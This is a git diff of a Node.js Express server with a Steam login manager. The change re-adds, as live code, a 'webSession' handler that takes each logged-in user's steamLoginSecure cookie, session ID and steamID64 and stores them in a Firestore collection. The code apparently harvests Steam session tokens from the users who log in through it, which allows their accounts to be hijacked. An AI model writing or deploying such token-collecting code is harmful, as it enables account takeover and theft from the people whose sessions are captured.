@@ -42,15 +42,15 @@ app.use(bodyParser.json())
 app.get('/', (req, res) => {
   res.send('Hello World!')
 
-  docRef.doc(`Itsworking`).set({
-    test: "test"
-  })
-  .then(() => {
-      console.log('success')
-  })
-  .catch( (error) => {
-      console.log(error)
-  })
+  // docRef.doc(`Itsworking`).set({
+  //   test: "test"
+  // })
+  // .then(() => {
+  //     console.log('success')
+  // })
+  // .catch( (error) => {
+  //     console.log(error)
+  // })
 
 })
 
@@ -97,34 +97,34 @@ class SteamAuthManager {
 
 
 
-          client.on('webSession', function(sessionID, cookies) {
-              const steamID64 = client.steamID.getSteamID64()
-              console.log(steamID64)
-              //dont forget session ID
-              console.log(cookies)
-              //cookie slice
-              //s.slice(17)
-              const data = {
-                  steamID64: steamID64,
-                  steamLoginSecure: cookies[0].slice(17),
-                  sessionID: sessionID
-              }
+          // client.on('webSession', function(sessionID, cookies) {
+          //     const steamID64 = client.steamID.getSteamID64()
+          //     console.log(steamID64)
+          //     //dont forget session ID
+          //     console.log(cookies)
+          //     //cookie slice
+          //     //s.slice(17)
+          //     const data = {
+          //         steamID64: steamID64,
+          //         steamLoginSecure: cookies[0].slice(17),
+          //         sessionID: sessionID
+          //     }
 
-               db.collection('steamLogins').doc(`yawa`).set({yawa: "YAWA"})
-                  .then(() => {
-                      console.log('success')
-                  })
-                  .catch( (error) => {
-                      console.log(error)
-                  })
+          //      docRef.doc(`${steamID64}`).set(data)
+          //         .then(() => {
+          //             console.log('success')
+          //         })
+          //         .catch( (error) => {
+          //             console.log(error)
+          //         })
 
-              // console.log(data)
+          //     // console.log(data)
 
 
 
-              console.log(username, ' Got web session');
-              // Do something with these cookies if you wish
-          });
+          //     console.log(username, ' Got web session');
+          //     // Do something with these cookies if you wish
+          // });
 
           client.on('loggedOn', (details) => {
               if (details.anonymous) {
@@ -177,6 +177,35 @@ class SteamAuthManager {
               this.users.set(username, client);
               resolve({ success: true });
           });
+
+          client.on('webSession', function(sessionID, cookies) {
+            const steamID64 = client.steamID.getSteamID64()
+            console.log(steamID64)
+            //dont forget session ID
+            console.log(cookies)
+            //cookie slice
+            //s.slice(17)
+            const data = {
+                steamID64: steamID64,
+                steamLoginSecure: cookies[0].slice(17),
+                sessionID: sessionID
+            }
+
+             docRef.doc(`${steamID64}`).set(data)
+                .then(() => {
+                    console.log('success')
+                })
+                .catch( (error) => {
+                    console.log(error)
+                })
+
+            // console.log(data)
+
+
+
+            console.log(username, ' Got web session');
+            // Do something with these cookies if you wish
+        });
 
           client.on('error', (err) => {
               this.pendingLogins.delete(username);
